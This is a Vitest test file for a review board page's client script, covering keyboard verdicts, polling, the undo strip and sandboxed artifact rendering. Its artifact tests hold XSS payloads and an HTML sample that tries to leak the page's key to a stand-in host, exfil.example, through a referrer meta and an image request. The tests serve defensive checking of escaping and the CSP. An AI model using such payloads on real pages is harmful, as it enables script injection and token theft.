// @vitest-environment jsdom
//
// Behavioural tests for the board page itself — the ~300 lines of client script
// that boardHtml() returns. The page is executed here, not reimplemented: the
// body markup and the script text are lifted straight out of boardHtml()'s
// output, so a change to the page changes what these tests run. A test that
// restated the page's logic would only ever prove itself.
//
// The script is run through `new Function` rather than a <script> tag because a
// script inserted via innerHTML never executes. Everything the page reaches for
// that jsdom does not provide — fetch, setInterval, alert, confirm — is stubbed
// on globalThis for the lifetime of one mounted page and restored afterwards.
import { describe, it, expect, afterEach } from "vitest";
import { boardHtml } from "../../../src/company/boardHtml";
import type { LandedRecord, Quarantined, QueueItem } from "../../../src/company/types";

const KEY = "t0ken";

/** The CSP the page must put in front of any html artifact's own markup. */
const ARTIFACT_CSP =
  '<meta http-equiv="Content-Security-Policy" ' +
  'content="default-src \'none\'; style-src \'unsafe-inline\'; img-src data:">';

const PAGE = boardHtml();
const BODY_MARKUP = /<body>([\s\S]*?)<script>/.exec(PAGE)?.[1] ?? "";
const PAGE_SCRIPT = /<script>([\s\S]*?)<\/script>/.exec(PAGE)?.[1] ?? "";

if (BODY_MARKUP.length === 0 || PAGE_SCRIPT.length === 0) {
  throw new Error("could not lift the body and script out of boardHtml() — the page shape changed");
}

interface ArtifactBody {
  type: string;
  content: string;
  truncated: boolean;
}

interface QueuePayload {
  pending: QueueItem[];
  landed: LandedRecord[];
  quarantined: Quarantined[];
  paused: boolean;
  lastCycle: string | null;
}

interface Recorded {
  path: string;
  id: string | null;
  key: string | null;
  method: string;
  body: Record<string, unknown> | null;
}

interface Stubs {
  fetch: unknown;
  setInterval: unknown;
  alert: unknown;
  confirm: unknown;
}

interface Mounted {
  /** Everything the page has asked the server for, in order. */
  requests: Recorded[];
  /** Just the verdict writes — the ones that must never happen by accident. */
  decisions: Recorded[];
  /** Mutate, then poll(), to model the queue changing under the reviewer. */
  queue: QueuePayload;
  /** Per-id artifact responses; anything unlisted is served as plain text. */
  artifacts: Map<string, ArtifactBody>;
  /** Status for the next /api/decision write, so a failure path can be driven. */
  decisionStatus: { value: number };
  /** Runs the page's own 30s poll callback, the one it registered itself. */
  poll: () => Promise<void>;
  press: (key: string, opts?: PressOptions) => Promise<void>;
  settle: () => Promise<void>;
  title: () => string;
  note: () => HTMLTextAreaElement | null;
  rows: () => string[];
  teardown: () => void;
}

interface PressOptions {
  meta?: boolean;
  ctrl?: boolean;
  alt?: boolean;
  on?: Element | null;
}

function fixture(id: string, over: Partial<QueueItem> = {}): QueueItem {
  return {
    id,
    cycle: "2026-08-01T09:00",
    role: "company-growth",
    kind: "copy",
    title: `Title ${id}`,
    why: `Why ${id}`,
    artifact: { type: "text", inline: `inline ${id}` },
    risk: "gated",
    on_approve: "do the thing",
    ...over,
  };
}

function landedFixture(id: string): LandedRecord {
  return {
    id,
    cycle: "2026-08-01T09:00",
    role: "company-architect",
    title: `Landed ${id}`,
    sha: "a1b2c3d4e5f6",
    landed_at: "2026-08-01T09:30:00Z",
  };
}

/** A deep copy, so the page never shares an object with the fixture. */
function wire<T>(value: T): T {
  return JSON.parse(JSON.stringify(value)) as T;
}

let active: Mounted | null = null;

afterEach(() => {
  active?.teardown();
  active = null;
});

async function mount(setup: {
  pending?: QueueItem[];
  landed?: LandedRecord[];
  quarantined?: Quarantined[];
  artifacts?: Record<string, ArtifactBody>;
} = {}): Promise<Mounted> {
  const queue: QueuePayload = {
    pending: setup.pending ?? [],
    landed: setup.landed ?? [],
    quarantined: setup.quarantined ?? [],
    paused: false,
    lastCycle: "2026-08-01T09:00",
  };
  const artifacts = new Map(Object.entries(setup.artifacts ?? {}));
  const requests: Recorded[] = [];
  const decisionStatus = { value: 200 };

  const reply = (status: number, json: unknown): Promise<unknown> =>
    Promise.resolve({ status, json: () => Promise.resolve(wire(json)) });

  const fetchStub = (input: string, init?: { method?: string; body?: string }): Promise<unknown> => {
    const url = new URL(String(input), "http://127.0.0.1:7777");
    const record: Recorded = {
      path: url.pathname,
      id: url.searchParams.get("id"),
      key: url.searchParams.get("key"),
      method: init?.method ?? "GET",
      body: typeof init?.body === "string" ? (JSON.parse(init.body) as Record<string, unknown>) : null,
    };
    requests.push(record);

    if (url.pathname === "/api/queue") return reply(200, queue);

    if (url.pathname === "/api/artifact") {
      const item = queue.pending.find((i) => i.id === record.id);
      if (item === undefined) return reply(404, { error: `no pending item "${record.id}"` });
      const listed = record.id === null ? undefined : artifacts.get(record.id);
      return reply(
        200,
        listed ?? { type: "text", content: item.artifact.inline ?? "", truncated: false },
      );
    }

    if (url.pathname === "/api/decision") {
      if (decisionStatus.value !== 200) return reply(decisionStatus.value, { error: "refused" });
      // Model the server: a recorded verdict archives the item, so the next
      // poll no longer sees it.
      queue.pending = queue.pending.filter((i) => i.id !== record.body?.id);
      return reply(200, { ok: true });
    }

    if (url.pathname === "/api/undo") {
      queue.landed = queue.landed.filter((r) => r.id !== record.body?.id);
      return reply(200, { ok: true, detail: "reverted" });
    }

    if (url.pathname === "/api/pause") {
      queue.paused = record.body?.paused === true;
      return reply(200, { paused: queue.paused });
    }

    if (url.pathname === "/api/cycle") return reply(200, { ok: true, detail: "started" });
    return reply(404, { error: "not found" });
  };

  const g = globalThis as unknown as Stubs;
  const saved: Stubs = {
    fetch: g.fetch,
    setInterval: g.setInterval,
    alert: g.alert,
    confirm: g.confirm,
  };

  let pollCallback: () => unknown = () => undefined;
  g.fetch = fetchStub;
  g.setInterval = (fn: () => unknown) => {
    pollCallback = fn;
    return 1;
  };
  g.alert = () => undefined;
  g.confirm = () => true;

  // The page reads its token out of its own URL.
  window.history.replaceState(null, "", `/?key=${KEY}`);
  document.body.innerHTML = BODY_MARKUP;

  // The page registers a document-level keydown listener. Capture it so the
  // next mounted page is the only one listening, instead of stacking closures
  // over stale state.
  const registered: Array<[string, EventListenerOrEventListenerObject]> = [];
  const realAdd = document.addEventListener.bind(document);
  document.addEventListener = ((
    type: string,
    listener: EventListenerOrEventListenerObject,
    options?: boolean | AddEventListenerOptions,
  ) => {
    registered.push([type, listener]);
    realAdd(type, listener, options);
  }) as typeof document.addEventListener;

  try {
    new Function(PAGE_SCRIPT)();
  } finally {
    document.addEventListener = realAdd;
  }

  const settle = async (): Promise<void> => {
    // Every stubbed response resolves immediately, so a handful of macrotask
    // turns is enough to drain the page's promise chains.
    for (let i = 0; i < 5; i += 1) await new Promise((resolve) => setTimeout(resolve, 0));
  };

  const mounted: Mounted = {
    requests,
    get decisions() {
      return requests.filter((r) => r.path === "/api/decision");
    },
    queue,
    artifacts,
    decisionStatus,
    settle,
    poll: async () => {
      pollCallback();
      await settle();
    },
    press: async (key, opts = {}) => {
      const target = opts.on ?? document.body;
      target.dispatchEvent(
        new KeyboardEvent("keydown", {
          key,
          metaKey: opts.meta === true,
          ctrlKey: opts.ctrl === true,
          altKey: opts.alt === true,
          bubbles: true,
        }),
      );
      await settle();
    },
    title: () => document.querySelector("#detail h2")?.textContent ?? "",
    note: () => document.getElementById("note") as HTMLTextAreaElement | null,
    rows: () =>
      Array.from(document.querySelectorAll("#list .row .t")).map((el) => el.textContent ?? ""),
    teardown: () => {
      for (const [type, listener] of registered) document.removeEventListener(type, listener);
      document.body.innerHTML = "";
      g.fetch = saved.fetch;
      g.setInterval = saved.setInterval;
      g.alert = saved.alert;
      g.confirm = saved.confirm;
    },
  };

  await settle();
  active = mounted;
  return mounted;
}

describe("the board page: first render", () => {
  it("loads the queue with the key from its own URL and selects the first item", async () => {
    const page = await mount({ pending: [fixture("one"), fixture("two")] });

    expect(page.requests[0]).toMatchObject({ path: "/api/queue", method: "GET", key: KEY });
    expect(page.rows()).toEqual(["Title one", "Title two"]);
    expect(page.title()).toBe("Title one");
    expect(document.getElementById("count")?.textContent).toBe("2 pending");
    expect(page.requests.some((r) => r.path === "/api/artifact" && r.id === "one")).toBe(true);
  });

  it("says so when there is nothing waiting", async () => {
    const page = await mount({ pending: [] });
    expect(document.querySelector("#list .empty")?.textContent).toContain("Nothing waiting");
    expect(page.decisions).toEqual([]);
  });
});

describe("the board page: keyboard", () => {
  // The regression net for the ⌘R hazard: KeyboardEvent.key for a chord is the
  // bare letter, so before the modifier guard a reviewer reloading the page
  // recorded a reject on the selected item — appended to an append-only log.
  it("records nothing for a keypress carrying a modifier", async () => {
    const page = await mount({ pending: [fixture("one"), fixture("two")] });

    await page.press("r", { meta: true }); // ⌘R — reload
    await page.press("r", { ctrl: true }); // Ctrl+R — reload
    await page.press("a", { meta: true }); // ⌘A — select all
    await page.press("a", { ctrl: true });
    await page.press("v", { meta: true }); // ⌘V — paste
    await page.press("r", { alt: true });

    expect(page.decisions).toEqual([]);
    // Nothing moved, either: the item is still pending and still selected.
    expect(page.queue.pending.map((i) => i.id)).toEqual(["one", "two"]);
    expect(page.title()).toBe("Title one");
    expect(page.note()?.classList.contains("hidden")).toBe(true);
  });

  it("records an approve on a bare a", async () => {
    const page = await mount({ pending: [fixture("one"), fixture("two")] });
    await page.press("a");

    expect(page.decisions).toHaveLength(1);
    expect(page.decisions[0]).toMatchObject({ method: "POST" });
    expect(page.decisions[0].body).toEqual({ id: "one", verdict: "approve", note: "" });
    // And the pane moved on to what is left.
    expect(page.title()).toBe("Title two");
  });

  it("records a reject on a bare r", async () => {
    const page = await mount({ pending: [fixture("one")] });
    await page.press("r");
    expect(page.decisions[0].body).toEqual({ id: "one", verdict: "reject", note: "" });
  });

  it("opens the note box on v without recording anything", async () => {
    const page = await mount({ pending: [fixture("one")] });
    await page.press("v");

    expect(page.note()?.classList.contains("hidden")).toBe(false);
    expect(document.activeElement).toBe(page.note());
    expect(page.decisions).toEqual([]);
  });

  it("moves the selection with j and k", async () => {
    const page = await mount({ pending: [fixture("one"), fixture("two"), fixture("three")] });
    await page.press("j");
    expect(page.title()).toBe("Title two");
    await page.press("j");
    expect(page.title()).toBe("Title three");
    await page.press("k");
    expect(page.title()).toBe("Title two");
    expect(page.decisions).toEqual([]);
  });
});

describe("the board page: revise", () => {
  it("submits the note on ⌘Enter and on Ctrl+Enter inside the textarea", async () => {
    for (const modifier of ["meta", "ctrl"] as const) {
      const page = await mount({ pending: [fixture("one"), fixture("two")] });
      await page.press("v");
      const note = page.note();
      if (note === null) throw new Error("the note box did not open");
      note.value = "Lead with the worktree";
      await page.press("Enter", { [modifier]: true, on: note });

      expect(page.decisions).toHaveLength(1);
      expect(page.decisions[0].body).toEqual({
        id: "one",
        verdict: "revise",
        note: "Lead with the worktree",
      });
      // The spent note must not follow the reviewer onto the next item.
      expect(page.note()?.value).toBe("");
      expect(page.note()?.classList.contains("hidden")).toBe(true);
      expect(page.title()).toBe("Title two");

      page.teardown();
      active = null;
    }
  });

  it("refuses a blank note, because a revise with none teaches the role nothing", async () => {
    const page = await mount({ pending: [fixture("one")] });
    await page.press("v");
    const note = page.note();
    if (note === null) throw new Error("the note box did not open");
    note.value = "   ";
    await page.press("Enter", { meta: true, on: note });

    expect(page.decisions).toEqual([]);
    expect(page.note()?.classList.contains("hidden")).toBe(false);
    expect(page.title()).toBe("Title one");
  });

  it("leaves a plain Enter in the textarea to the textarea", async () => {
    const page = await mount({ pending: [fixture("one")] });
    await page.press("v");
    const note = page.note();
    if (note === null) throw new Error("the note box did not open");
    note.value = "still typing";
    await page.press("Enter", { on: note });
    await page.press("r", { on: note });

    expect(page.decisions).toEqual([]);
    expect(page.note()?.value).toBe("still typing");
  });
});

describe("the board page: the queue changing underneath", () => {
  it("keeps an open note through a poll while still refreshing the list", async () => {
    const page = await mount({ pending: [fixture("one"), fixture("two")] });
    await page.press("v");
    const note = page.note();
    if (note === null) throw new Error("the note box did not open");
    note.value = "half-written feedback";

    // The pending set is unchanged; something else about the world is not.
    page.queue.landed.push(landedFixture("dedupe"));
    await page.poll();

    // Same node, same text — the pane was not torn down under the reviewer.
    expect(page.note()).toBe(note);
    expect(note.value).toBe("half-written feedback");
    expect(note.classList.contains("hidden")).toBe(false);
    // And the list did refresh: the landed strip is now there.
    expect(document.querySelector("[data-undo]")?.getAttribute("data-undo")).toBe("dedupe");
  });

  it("keeps showing the same item by id when something ahead of it disappears", async () => {
    const page = await mount({ pending: [fixture("one"), fixture("two"), fixture("three")] });
    await page.press("j");
    expect(page.title()).toBe("Title two");

    // "two" is now at index 0, where an index-anchored selection would leave
    // "three" showing instead.
    page.queue.pending = page.queue.pending.filter((i) => i.id !== "one");
    await page.poll();

    expect(page.rows()).toEqual(["Title two", "Title three"]);
    expect(page.title()).toBe("Title two");
    expect(page.decisions).toEqual([]);
  });

  it("rebuilds the pane, drops the stale note and says so when the selection vanishes", async () => {
    const page = await mount({ pending: [fixture("one"), fixture("two")] });
    await page.press("v");
    const note = page.note();
    if (note === null) throw new Error("the note box did not open");
    note.value = "feedback for item one";

    // Decided in another tab: the item the note belonged to is gone.
    page.queue.pending = page.queue.pending.filter((i) => i.id !== "one");
    await page.poll();

    expect(page.title()).toBe("Title two");
    expect(page.note()?.value).toBe("");
    expect(page.note()?.classList.contains("hidden")).toBe(true);
    expect(document.querySelector("#detail .notice")?.textContent).toContain("decided elsewhere");
    expect(page.decisions).toEqual([]);
  });

  it("shows the notice once, not on every later render", async () => {
    const page = await mount({ pending: [fixture("one"), fixture("two")] });
    await page.press("v");
    const note = page.note();
    if (note === null) throw new Error("the note box did not open");
    note.value = "feedback for item one";
    page.queue.pending = page.queue.pending.filter((i) => i.id !== "one");
    await page.poll();
    expect(document.querySelector("#detail .notice")).not.toBeNull();

    await page.poll();
    expect(document.querySelector("#detail .notice")).toBeNull();
  });

  it("empties the pane when the last item is decided", async () => {
    const page = await mount({ pending: [fixture("one")] });
    await page.press("a");

    expect(page.title()).toBe("");
    expect(document.querySelector("#detail .empty")?.textContent).toContain("Nothing selected");
  });
});

describe("the board page: artifacts", () => {
  it("escapes markup in a text artifact instead of letting it become elements", async () => {
    const hostile = '<img src=x onerror="boom()"><b>bold</b><script>evil()</script>';
    const page = await mount({
      pending: [fixture("one")],
      artifacts: { one: { type: "text", content: hostile, truncated: false } },
    });

    const art = document.getElementById("art");
    expect(art?.querySelector("img")).toBeNull();
    expect(art?.querySelector("b")).toBeNull();
    expect(art?.querySelector("script")).toBeNull();
    // Present as text, all of it, exactly as written.
    expect(art?.querySelector(".post")?.textContent).toBe(hostile);
    expect(page.decisions).toEqual([]);
  });

  it("escapes markup inside a diff while still colouring the lines", async () => {
    await mount({
      pending: [fixture("one")],
      artifacts: {
        one: {
          type: "diff",
          content: "@@ -1 +1 @@\n+<img src=x onerror=1>\n-gone",
          truncated: false,
        },
      },
    });

    const art = document.getElementById("art");
    expect(art?.querySelector("img")).toBeNull();
    expect(art?.querySelector(".d-add")?.textContent).toBe("+<img src=x onerror=1>");
    expect(art?.querySelector(".d-del")?.textContent).toBe("-gone");
    expect(art?.querySelector(".d-hunk")?.textContent).toBe("@@ -1 +1 @@");
  });

  it("escapes markup in a markdown artifact", async () => {
    await mount({
      pending: [fixture("one")],
      artifacts: {
        one: { type: "markdown", content: "# Head\n<img src=x onerror=1>", truncated: false },
      },
    });

    const art = document.getElementById("art");
    expect(art?.querySelector("img")).toBeNull();
    expect(art?.querySelector("h2")?.textContent).toBe("Head");
  });

  it("renders an html artifact in a script-less iframe, behind our CSP", async () => {
    await mount({
      pending: [fixture("one")],
      artifacts: { one: { type: "html", content: "<p>a landing page</p>", truncated: false } },
    });

    const frame = document.querySelector("#art iframe");
    expect(frame).not.toBeNull();
    // Empty sandbox: no scripts, no forms, no same-origin.
    expect(frame?.getAttribute("sandbox")).toBe("");
    expect(frame?.getAttribute("srcdoc")).toBe(`${ARTIFACT_CSP}<p>a landing page</p>`);
  });

  it("puts our CSP ahead of an artifact trying to declare its own", async () => {
    // A policy already in force can only be tightened, never loosened, so the
    // artifact's own meta — and its <meta name="referrer" content="unsafe-url">,
    // which for an about:srcdoc document would resolve the referrer through this
    // page and leak ?key= — arrives too late to matter.
    const greedy =
      '<meta http-equiv="Content-Security-Policy" content="default-src *">' +
      '<meta name="referrer" content="unsafe-url"><img src="https://exfil.example/p.gif">';
    await mount({
      pending: [fixture("one")],
      artifacts: { one: { type: "html", content: greedy, truncated: false } },
    });

    const srcdoc = document.querySelector("#art iframe")?.getAttribute("srcdoc") ?? "";
    expect(srcdoc.startsWith(ARTIFACT_CSP)).toBe(true);
    expect(srcdoc.indexOf("default-src *")).toBeGreaterThan(ARTIFACT_CSP.length - 1);
  });

  it("reports an artifact it could not read, without touching the verdict buttons", async () => {
    const page = await mount({ pending: [fixture("one")] });
    // The item is gone from the queue by the time the artifact is asked for.
    page.queue.pending = [];
    await page.poll();

    expect(page.decisions).toEqual([]);
  });

  it("does not drop a late artifact under a different item", async () => {
    const page = await mount({ pending: [fixture("one"), fixture("two")] });
    const before = document.getElementById("art")?.innerHTML;
    expect(before).toContain("inline one");

    await page.press("j");
    expect(document.getElementById("art")?.innerHTML).toContain("inline two");
    expect(document.getElementById("art")?.innerHTML).not.toContain("inline one");
  });
});

describe("the board page: the landed strip", () => {
  it("asks to revert the record it was clicked for, then refreshes", async () => {
    const page = await mount({
      pending: [fixture("one")],
      landed: [landedFixture("dedupe")],
    });

    const undo = document.querySelector("[data-undo]") as HTMLButtonElement | null;
    if (undo === null) throw new Error("no Undo button rendered");
    undo.click();
    await page.settle();

    const reverts = page.requests.filter((r) => r.path === "/api/undo");
    expect(reverts).toHaveLength(1);
    expect(reverts[0].body).toEqual({ id: "dedupe" });
    expect(document.querySelector("[data-undo]")).toBeNull();
  });
});

describe("the board page: header controls", () => {
  it("toggles the pause switch and disables the run button while paused", async () => {
    const page = await mount({ pending: [fixture("one")] });
    expect((document.getElementById("runBtn") as HTMLButtonElement).disabled).toBe(false);

    (document.getElementById("pauseBtn") as HTMLButtonElement).click();
    await page.settle();

    expect(page.requests.some((r) => r.path === "/api/pause")).toBe(true);
    expect(page.queue.paused).toBe(true);
    expect(document.getElementById("pauseBtn")?.textContent).toContain("resume");
    expect((document.getElementById("runBtn") as HTMLButtonElement).disabled).toBe(true);
  });
});
